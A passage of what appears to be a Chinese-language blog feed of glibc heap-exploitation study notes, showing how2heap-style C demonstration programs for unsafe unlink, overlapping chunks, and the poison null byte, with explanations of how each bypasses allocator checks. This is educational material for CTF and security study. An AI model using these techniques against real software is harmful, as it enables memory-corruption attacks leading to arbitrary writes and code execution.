class="hljs-string">&quot;之前的值是: %s\n&quot;</span>,victim_string);<br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242L</span>L;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;新的值是: %s\n&quot;</span>,victim_string);<br>&#125;<br></code></pre></td></tr></table></figure><p>检查绕过：</p><blockquote><p>P-&gt;fd&#x3D;ptr-0x18，P-&gt;bk&#x3D;ptr-0x10</p></blockquote><p>利用unlink的FD-&gt;bk&#x3D;BK,BK-&gt;fd&#x3D;FD的特性，几乎可以做到任意地址写。</p><blockquote><p>此时ptr被修改为ptr-0x18，可以通过更改bk指针的值来进行利用</p></blockquote><p>（unsafe_unlink在glibc_2.31之前都是可以用的，利用unsafe_unlink需要泄露堆地址）</p><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br>    <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这是一个简单的堆块重叠问题，首先申请 3 个 chunk\n&quot;</span>);<br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这三个 chunk 分别申请到了:\np1：%p\np2：%p\np3：%p\n给他们分别填充\&quot;1\&quot;\&quot;2\&quot;\&quot;3\&quot;\n\n&quot;</span>, p1, p2, p3);<br><br>    <span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 p2\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p2 被放到 unsorted bin 中\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设有一个堆溢出漏洞，可以覆盖 p2\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br>    <span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们将 p2 的大小设置为 %d, 这样的话我们就能用 %d 大小的空间\n&quot;</span>,evil_chunk_size, evil_region_size);<br><br>    *(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// 覆盖 p2 的 size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在让我们分配另一个块，其大小等于块p2注入大小的数据大小\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）\n&quot;</span>);<br>    p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 分配在 %p 到 %p 这一区域\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 从 %p 到 %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p3, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来验证一下，现在 p3 与 p4:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n如果我们使用 memset(p4, &#x27;4&#x27;, %d), 将会:\n&quot;</span>, evil_region_size);<br>    <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n那么之后再 memset(p3, &#x27;3&#x27;, 80), 将会:\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x10</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>申请一个大堆块p2（大于0x80），把p2 free掉会进入unsortedbins，这时候把size改为p2的size+p3的size-0x20，再把p2申请回来就会出现p2完全覆盖p3。此时p2可以修改p3的内容，p3也可以修改p2的内容。</p><h3 id="over-lapping-chunks-2"><a href="#over-lapping-chunks-2" class="headerlink" title="over_lapping_chunks_2"></a>over_lapping_chunks_2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n一开始分配 5 个 chunk&quot;</span>);<br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p1 从 %p 到 %p&quot;</span>, p1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1+malloc_usable_size(p1));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 从 %p 到 %p&quot;</span>, p2,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p2+malloc_usable_size(p2));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p&quot;</span>, p3,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p3+malloc_usable_size(p3));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 从 %p 到 %p&quot;</span>, p4, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p4+malloc_usable_size(p4));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 从 %p 到 %p\n&quot;</span>, p5,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p5+malloc_usable_size(p5));<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p4);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n&quot;</span>);<br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n这样的话将会 free 掉的 p2 将会包含 p3\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p2);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n&quot;</span>);<br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 从 %p 到 %p&quot;</span>, p6,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p6+real_size_p6);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p\n&quot;</span>, p3, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p3+real_size_p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n往 p6 中写入\&quot;F\&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与前面不同的是，这次修改size是在free之前的，修改之后free p2会把p2和p3识别成一个块，然后把它申请回来就能用p2控制p3</p><h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><p>同前面，不过不是在堆上，而是用mmap分配的一个新区域</p><h3 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h3> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当存在 off by null 的时候可以使用该技术\n&quot;</span>);<br><br>    <span class="hljs-type">uint8_t</span>* a;<br>    <span class="hljs-type">uint8_t</span>* b;<br>    <span class="hljs-type">uint8_t</span>* c;<br>    <span class="hljs-type">uint8_t</span>* b1;<br>    <span class="hljs-type">uint8_t</span>* b2;<br>    <span class="hljs-type">uint8_t</span>* d;<br>    <span class="hljs-type">void</span> *barrier;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请 0x100 的 chunk a\n&quot;</span>);<br>    a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;a 在: %p\n&quot;</span>, a);<br>    <span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n&quot;</span>, real_a_size);<br><br>    b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>    c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>    barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n&quot;</span>, barrier);<br><br>    <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n&quot;</span>);<br>    *(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br>    <span class="hljs-built_in">free</span>(b);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 的 size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n&quot;</span>);<br>    a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b 现在的 size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>    <span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;c 的 prev_size 是 %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>        *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>    b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 0x100 大小的 b1: %p\n&quot;</span>,b1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n&quot;</span>,*c_prev_size_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;但是我们之前写 0x200 那个地方已经改成了: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来 malloc &#x27;b2&#x27;, 作为 &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br>    b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;b2 申请在: %p\n&quot;</span>,b2);<br><br>    <span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 填充的内容是:\n%s\n&quot;</span>,b2);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(b1);<br>    <span class="hljs-built_in">free</span>(c);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;d 申请到了: %p，我们填充一下 d 为 \&quot;D\&quot;\n&quot;</span>,d);<br>    <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 b2 的内容就是:\n%s\n&quot;</span>,b2);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>对p2进行切割，但是p2的presize填在了p3-0x10的位置，在free p2后，对它切割两次，此时再free p2和p3就会出现二者合并，但是中间有正在使用的由p2切割出来的一个块。这时再申请一个p2+p3大小的块就能够控制那个切割出来的块了。</p><p>————持续更新中</p>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNCTF2025WP</title>
    <link href="/2025/03/24/1/"/>
    <url>/2025/03/24/1/</url>
    
